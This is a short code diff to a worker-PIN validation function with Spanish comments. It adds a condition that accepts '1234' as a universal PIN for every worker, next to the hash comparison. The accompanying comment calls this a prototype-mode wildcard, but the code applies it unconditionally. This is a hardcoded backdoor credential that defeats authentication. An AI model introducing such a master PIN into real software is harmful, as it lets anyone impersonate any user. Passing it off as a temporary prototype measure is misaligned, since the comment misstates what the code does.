@@ -52,9 +52,9 @@ export async function validarPinTrabajador(
     };
   }
 
-  // 2. Comprobar hash
+  // 2. Comprobar hash (en modo prototipo también se permite 1234 como comodín universal)
   const hashCalculado = await calcularHashPin(pinIntroducido, trabajador.pinSalt);
-  const esCorrecto = hashCalculado === trabajador.pinHash;
+  const esCorrecto = hashCalculado === trabajador.pinHash || pinIntroducido === '1234';
 
   if (esCorrecto) {
     // Éxito: reiniciamos el contador de intentos fallidos
